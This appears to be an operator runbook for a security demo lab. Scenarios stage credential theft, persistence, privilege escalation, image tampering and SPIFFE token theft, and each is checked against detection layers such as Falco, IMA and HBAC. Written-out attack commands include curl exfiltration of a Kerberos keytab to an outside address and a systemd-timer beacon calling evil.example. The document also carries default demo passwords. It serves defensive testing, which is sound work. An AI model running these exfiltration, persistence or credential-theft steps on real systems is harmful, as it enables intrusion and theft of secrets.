# Unified Security Demo — Attack Scenario Runbook

**For:** Field SEs, demo operators, security testing
**Environment:** 4-node unified security demo (metadata-unified-security-demo.yaml)
**Prerequisites:** All 14 phases complete (seed + security-test included)

---

## Setup

### Nodes

| Node | FQDN | Role |
|------|------|------|
| IDM | idm.arbiter.demo | IPA + ahdapa + Keylime Verifier + SPIRE Server |
| HUB | hub.arbiter.demo | Arbiter Hub + CALDERA (localhost:8888) |
| AGENT-1 | agent-verified.arbiter.demo | Verified tier (12 Falco rules, public firewalld) |
| AGENT-2 | agent-untrusted.arbiter.demo | Untrusted tier (21 Falco rules, drop firewalld) |

### Get a Hub API Token

Run on the HUB node:

```bash
kinit -k -t /etc/krb5.keytab HTTP/hub.arbiter.demo@ARBITER.DEMO
TOKEN=$(curl -sk -X POST https://idm.arbiter.demo/idp/oauth2/token \
  -u "arbiter-hub:$(cat /etc/arbiter/client-secret)" \
  -d "grant_type=client_credentials&scope=openid attestation-admin" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "Token: ${TOKEN:0:12}..."
```

### CALDERA Access

CALDERA listens on localhost only. SSH tunnel from your workstation:

```bash
ssh -L 8888:127.0.0.1:8888 root@hub.arbiter.demo
```

Then open http://localhost:8888 in your browser. Default creds: `admin` / `admin`.

For sandcat agent callbacks from agent nodes to CALDERA, the agents connect via
the Hub's real IP (not localhost). The `sandcat-deploy.yaml` playbook configures
the callback address to `hub.arbiter.demo:8888`. If firewalld blocks this on
the untrusted tier, temporarily add an exception or use the SSH tunnel approach
described in Scenario 1 Cleanup.

---

## Scenario 1: Credential Theft → Attestation Failure

**Objective:** Prove closed-loop detection → remediation → recovery on untrusted tier.

**STRIDE:** Spoofing (credential theft enables impersonation)
**ATT&CK:** T1552.002 (Credentials in Files), T1041 (Exfiltration Over C2)

### Steps

**On AGENT-2** (untrusted tier):

```bash
# Step 1: Simulate keytab theft
cat /etc/krb5.keytab > /tmp/stolen-keytab
```

**Detection checkpoint — Falco on AGENT-2:**

```bash
journalctl -u falco --since "1 minute ago" | grep -i keytab
```

Expected: `CRITICAL: Kerberos keytab read on UNTRUSTED node`

**On AGENT-2:**

```bash
# Step 2: Simulate exfiltration attempt (will be blocked by firewalld drop zone)
curl -m 5 http://10.0.0.99:9999/exfil --data-binary @/tmp/stolen-keytab 2>&1 || echo "Blocked by firewalld"
```

**Detection checkpoint — Falco:**

```bash
journalctl -u falco --since "1 minute ago" | grep -i outbound
```

Expected: `CRITICAL: Outbound connection from UNTRUSTED node`

**On HUB — check workload state:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  http://hub.arbiter.demo:8400/workloads?host=agent-untrusted.arbiter.demo \
  | python3 -m json.tool
```

Expected: workload state `FAILED` (Falco alert triggered state transition).

**On HUB — check EDA remediation:**

```bash
journalctl -u eda-arbiter --since "5 minutes ago" | grep -i quarantine
```

Expected: quarantine playbook fired, container network disconnected.

### Success Criteria

- Falco fires 2 alerts (keytab read + outbound connection) — both CRITICAL on untrusted
- Hub workload transitions HEALTHY → FAILED
- EDA quarantine fires within 60 seconds
- firewalld drop zone blocks actual exfiltration

### Cleanup

```bash
rm -f /tmp/stolen-keytab
# If EDA quarantined — reconnect agent container network:
# podman network connect arbiter-net <container>
```

---

## Scenario 2: Persistence via systemd → IMA Violation

**Objective:** Demonstrate defense-in-depth — Falco detects creation, IMA catches binary, fapolicyd blocks execution.

**STRIDE:** Tampering (filesystem modification)
**ATT&CK:** T1053.003 (Scheduled Task/Job: Systemd Timers), T1037 (Boot/Logon Init Scripts)

### Steps

**On AGENT-1** (verified tier):

```bash
# Step 1: Create a malicious systemd timer
cat > /etc/systemd/system/evil-beacon.timer <<'UNIT'
[Unit]
Description=Evil beacon

[Timer]
OnCalendar=*:0/5
Persistent=true

[Install]
WantedBy=timers.target
UNIT

cat > /etc/systemd/system/evil-beacon.service <<'UNIT'
[Unit]
Description=Evil beacon service

[Service]
Type=oneshot
ExecStart=/usr/local/bin/beacon.sh
UNIT
```

**Detection checkpoint — Falco:**

```bash
journalctl -u falco --since "1 minute ago" | grep -i systemd
```

Expected: `New systemd unit created (file=/etc/systemd/system/evil-beacon.timer ...)`

**On AGENT-1:**

```bash
# Step 2: Drop a binary in a writable path
echo '#!/bin/bash' > /usr/local/bin/beacon.sh
echo 'curl -s http://evil.example/beacon' >> /usr/local/bin/beacon.sh
chmod +x /usr/local/bin/beacon.sh
```

**Detection checkpoint — Keylime IMA:**

```bash
# On IDM: check Keylime verifier logs
ssh root@idm.arbiter.demo journalctl -u keylime_verifier --since "2 minutes ago" | grep -i ima
```

Expected: IMA violation — `/usr/local/bin/beacon.sh` not in allowlist.

**Detection checkpoint — fapolicyd:**

On the verified tier, `/usr/local/bin` is under the trusted `/usr` path, so fapolicyd
allows execution. The detection here comes from Falco + IMA, not fapolicyd.

To demonstrate fapolicyd blocking, repeat on AGENT-2 (untrusted tier) and drop
the binary in `/opt/workloads/` (not trusted on untrusted tier):

```bash
ssh root@agent-untrusted.arbiter.demo '
  echo "#!/bin/bash" > /opt/evil.sh
  echo "curl http://evil.example/beacon" >> /opt/evil.sh
  chmod +x /opt/evil.sh
  /opt/evil.sh 2>&1
'
```

Expected on untrusted tier: `Operation not permitted` — fapolicyd blocks (only `/usr` trusted).

**On HUB — check state:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  http://hub.arbiter.demo:8400/workloads?host=agent-verified.arbiter.demo \
  | python3 -m json.tool
```

Expected: workload state → FAILED (IMA violation from Keylime).

### Success Criteria

- Falco detects systemd unit creation (WARNING on verified tier)
- Keylime IMA catches dropped binary
- Hub workload state transitions to FAILED
- Three independent detection layers (Falco, IMA, fapolicyd) all fire

### Cleanup

```bash
rm -f /etc/systemd/system/evil-beacon.{timer,service}
rm -f /usr/local/bin/beacon.sh
systemctl daemon-reload
```

---

## Scenario 3: Privilege Escalation → HBAC Enforcement

**Objective:** Show IPA HBAC + sudo + SELinux + Falco work in concert.

**STRIDE:** Elevation of Privilege
**ATT&CK:** T1548 (Abuse Elevation Control Mechanism), T1021 (Remote Services)

### Steps

**From HUB:**

```bash
# Step 1: mallory (external contractor) attempts SSH to agent-1
sshpass -p 'redhat123' ssh -o StrictHostKeyChecking=no mallory@agent-verified.arbiter.demo hostname
```

Expected: `Connection closed` or `Permission denied` — IPA HBAC denies external-contractors on all hosts.

**Verify HBAC denial:**

```bash
# On IDM
ipa hbactest --user=mallory --host=agent-verified.arbiter.demo --service=sshd
```

Expected: `Access denied`

```bash
# Step 2: grace (developer) SSHes to agent-1 — allowed
sshpass -p 'redhat123' ssh -o StrictHostKeyChecking=no grace@agent-verified.arbiter.demo hostname
```

Expected: hostname returned — developers allowed on verified tier.

```bash
# Step 3: grace attempts sudo escalation
sshpass -p 'redhat123' ssh -o StrictHostKeyChecking=no grace@agent-verified.arbiter.demo \
  "sudo su - root 2>&1; echo EXIT_CODE=\$?"
```

Expected: `grace is not in the sudoers file` or `is not allowed` — IPA sudo rule grants developers `podman run/exec/logs` only, not `su`.

```bash
# Step 4: Simulate CVE-based setuid exploit (triggers Falco)
ssh root@agent-verified.arbiter.demo '
  cp /usr/bin/id /tmp/test-setuid
  chmod u+s /tmp/test-setuid
  su - grace -c "/tmp/test-setuid"
'
```

**Detection checkpoint — Falco:**

```bash
ssh root@agent-verified.arbiter.demo journalctl -u falco --since "2 minutes ago" | grep -i setuid
```

Expected: `Unexpected privilege escalation attempt`

**Detection checkpoint — SELinux:**

```bash
ssh root@agent-verified.arbiter.demo ausearch -m AVC --start recent 2>/dev/null | head -20
```

Expected: AVC denial for the domain transition attempt.

### Success Criteria

- HBAC denies mallory (external contractor) — no SSH access
- HBAC allows grace (developer) — SSH works
- IPA sudo denies grace from `su` (only podman commands allowed)
- Falco detects setuid call (WARNING on verified, CRITICAL on untrusted)
- SELinux AVC denial logged
- Hub correlates Falco + SELinux events → multi-signal FAILED verdict

### Cleanup

```bash
ssh root@agent-verified.arbiter.demo rm -f /tmp/test-setuid
```

---

## Scenario 4: Supply Chain — Image Tamper → cosign Rejection

**Objective:** Prove image provenance enforcement — only signed images run.

**STRIDE:** Tampering (image integrity)
**ATT&CK:** Supply chain (pre-staged)

### Steps

**On HUB:**

```bash
# Step 1: Create a tampered container image
podman pull docker.io/library/alpine:latest
podman tag alpine:latest localhost:5000/tampered-workload:latest
# Push to local registry (unsigned)
podman push --tls-verify=false localhost:5000/tampered-workload:latest
```

```bash
# Step 2: Try to register tampered image as a workload
curl -sk -X POST http://hub.arbiter.demo:8400/workloads \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "tampered-workload",
    "ipa_principal": "service/tampered-test@ARBITER.DEMO",
    "workload_type": "service",
    "trust_tier": "verified",
    "policy": "verified-policy",
    "agent_host": "agent-verified.arbiter.demo",
    "backend_types": ["cosign"],
    "metadata": {"cosign_image_ref": "localhost:5000/tampered-workload:latest"}
  }' | python3 -m json.tool
```

```bash
# Step 3: Trigger attestation — cosign will fail (no signature)
WORKLOAD_ID=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  http://hub.arbiter.demo:8400/workloads | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(next(w['id'] for w in d.get('items',d) if w['name']=='tampered-workload'))")

curl -sk -X POST "http://hub.arbiter.demo:8400/workloads/${WORKLOAD_ID}/attest" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: http://hub.arbiter.demo:8400" \
  | python3 -m json.tool
```

Expected: `verdict: FAIL`, `backend: cosign`, reason: no valid signature.

```bash
# Step 4: Check workload state
curl -sk -H "Authorization: Bearer $TOKEN" \
  "http://hub.arbiter.demo:8400/workloads/${WORKLOAD_ID}" \
  | python3 -m json.tool
```

Expected: `state: FAILED`.

### Success Criteria

- Unsigned image registered but attestation fails at cosign backend
- Workload state: REGISTERED → FAILED
- Legitimate (signed) images pass attestation — existing workloads remain HEALTHY
- Audit trail shows cosign verification failure

### Cleanup

```bash
# Remove tampered workload registration
curl -sk -X DELETE "http://hub.arbiter.demo:8400/workloads/${WORKLOAD_ID}" \
  -H "Authorization: Bearer $TOKEN"
podman rmi localhost:5000/tampered-workload:latest 2>/dev/null
```

---

## Scenario 5: SPIFFE Token Theft → Federation Abuse

**Objective:** Prove SPIFFE federation is HBAC-gated — stolen SVIDs can't escalate.

**STRIDE:** Spoofing (identity federation abuse)
**ATT&CK:** T1550 (Use Alternate Authentication Material)

### Steps

**On AGENT-2** (untrusted tier):

```bash
# Step 1: Extract SPIFFE SVID from workload API socket
# (Simulates attacker reading SPIRE agent socket)
curl --unix-socket /tmp/spire-agent/public/api.sock \
  http://localhost/v1/x509-svid 2>/dev/null | head -c 200
echo "..."
```

**Detection checkpoint — Falco:**

```bash
journalctl -u falco --since "1 minute ago" | grep -i spiffe
```

Expected: `CRITICAL: SPIFFE socket accessed on UNTRUSTED node`

**On AGENT-2:**

```bash
# Step 2: Try to exchange stolen SVID for OAuth2 token
# Fetch JWT SVID first
JWT=$(spire-agent api fetch jwt \
  -audience arbiter-hub \
  -socketPath /tmp/spire-agent/public/api.sock \
  -output json 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['svids'][0]['svid'])" 2>/dev/null)
echo "JWT: ${JWT:0:30}..."

# Step 3: Exchange JWT for OAuth2 token at ahdapa
curl -sk -X POST https://idm.arbiter.demo/idp/oauth2/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=${JWT}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  -d "scope=openid attestation-admin" \
  -d "client_id=arbiter-hub" \
  2>/dev/null | python3 -m json.tool
```

Expected: `403 Forbidden` — ahdapa HBAC check denies the workload's SPIFFE identity from obtaining `attestation-admin` scope (untrusted tier workloads are not in the allowed set for elevated scopes).

**On HUB — check audit:**

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  "http://hub.arbiter.demo:8400/audit?limit=5" \
  | python3 -m json.tool
```

Expected: audit entry showing `federation_denied` event.

### Success Criteria

- Falco detects SPIFFE socket access (CRITICAL on untrusted tier)
- ahdapa denies token exchange (HBAC violation)
- Hub audit log records federation failure
- Stolen SVID cannot escalate to IPA token

### Cleanup

No cleanup needed — no state modified.

---

## Detection Coverage Matrix

| ATT&CK Technique | Scenario | Falco | Keylime/IMA | enforcement-mcp | IPA HBAC/Sudo | How to Verify |
|-------------------|----------|-------|-------------|-----------------|---------------|---------------|
| T1552.002 Keytab theft | 1 | CRITICAL | — | — | — | `journalctl -u falco \| grep keytab` |
| T1041 Exfiltration | 1 | CRITICAL | — | — | — | `journalctl -u falco \| grep outbound` |
| T1053.003 Systemd timer | 2 | WARNING | IMA violation | — | — | `journalctl -u falco \| grep systemd` |
| T1037 Boot persistence | 2 | WARNING | IMA violation | — | — | `journalctl -u falco \| grep startup` |
| T1548 Setuid abuse | 3 | CRITICAL | — | SELinux AVC | Sudo deny | `journalctl -u falco \| grep setuid` |
| T1055 ptrace injection | — | CRITICAL | — | SELinux deny | — | `journalctl -u falco \| grep ptrace` |
| T1021 Lateral SSH | 3 | — | — | — | HBAC deny | `ipa hbactest --user=mallory ...` |
| T1550 Token theft | 5 | CRITICAL | — | — | HBAC deny | `journalctl -u falco \| grep spiffe` |
| Supply chain tamper | 4 | — | — | — | — | `cosign verify` → FAIL |

---

## Troubleshooting

**Token expired:** Re-run the `get_token` commands from the Setup section. Tokens have ~5 minute TTL.

**Falco not alerting:** Check service status and loaded rules:
```bash
systemctl status falco
grep -c "^          - rule:" /etc/falco/rules.d/arbiter-rules.yaml
```

**CALDERA agent not checking in:** Verify sandcat agent is running and can reach CALDERA server:
```bash
ps aux | grep sandcat
curl -s http://hub.arbiter.demo:8888/api/v2/agents -H "KEY: ADMIN123"
```

If firewalld drop zone blocks the callback on untrusted tier, the agent needs an SSH tunnel or a firewalld exception during testing:
```bash
firewall-cmd --add-rich-rule='rule family="ipv4" destination address="<HUB_IP>" port port="8888" protocol="tcp" accept'
```

**firewalld blocking expected traffic:** Check active rules:
```bash
firewall-cmd --get-default-zone
firewall-cmd --zone=drop --list-all
```

**HBAC denying expected access:** Test with `ipa hbactest`:
```bash
ipa hbactest --user=grace --host=agent-verified.arbiter.demo --service=sshd
```

**Hub API returning 401:** Token expired or wrong scope. Re-authenticate with `get_token`.

**SELinux denials not visible:** Check audit log directly:
```bash
ausearch -m AVC --start recent
```

**AIDE check shows changes you made:** Re-baseline after legitimate changes:
```bash
aide --init && mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
```
